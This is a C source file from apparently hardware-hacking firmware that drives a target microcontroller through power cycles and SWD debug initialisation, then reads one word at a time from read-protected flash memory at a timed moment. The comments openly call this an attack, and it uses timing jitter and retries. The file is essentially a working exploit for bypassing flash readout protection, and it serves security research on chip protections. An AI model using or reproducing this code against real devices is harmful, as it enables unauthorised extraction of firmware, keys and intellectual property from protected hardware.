/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */

#include "main.h"
#include "swd.h"

/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */
swdStatus_t extractFlashData(uint32_t const address, uint32_t* const data) {
    swdStatus_t dbgStatus;

    /* Add some jitter on the moment of attack (may increase attack effectiveness) */
    static uint16_t delayJitter = DELAY_JITTER_MS_MIN;

    uint32_t extractedData = 0u;
    uint32_t idCode = 0u;

    /* Limit the maximum number of attempts PER WORD */
    uint32_t numReadAttempts = 0u;

    /* try up to MAX_READ_TRIES times until we have the data */
    do {
        digitalWrite(LED1_Pin, LOW);

        targetPowerOn();
        targetRestore(); /* release reset before SWD init */

        delay(POWER_ON_DELAY_MS);
        delay(RESET_RELEASE_MS);

        dbgStatus = swdInit(&idCode);

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdEnableDebugIF();
        }

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdSetAP32BitMode(NULL);
        }

        if (dbgStatus == swdStatusOk) {
            dbgStatus = swdSelectAHBAP();
        }

        if (dbgStatus == swdStatusOk) {
            /* NRST уже high, держим его и ждём окно гонки */
            delay(delayJitter);
            delayMicroseconds(500);

            /* The magic happens here! */
            dbgStatus = swdReadAHBAddr((address & 0xFFFFFFFCu), &extractedData);
        }

        targetReset(); /* pull NRST low before power off */

        /* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */
        if (dbgStatus == swdStatusOk) {
            *data = extractedData;
            digitalWrite(LED1_Pin, HIGH);
        } else {
            ++numReadAttempts;

            delayJitter += DELAY_JITTER_MS_INCREMENT;
            if (delayJitter >= DELAY_JITTER_MS_MAX) {
                delayJitter = DELAY_JITTER_MS_MIN;
            }
        }

        targetPowerOff();
        delay(2);

    } while ((dbgStatus != swdStatusOk) && (numReadAttempts < (MAX_READ_ATTEMPTS)));

    return dbgStatus;
}
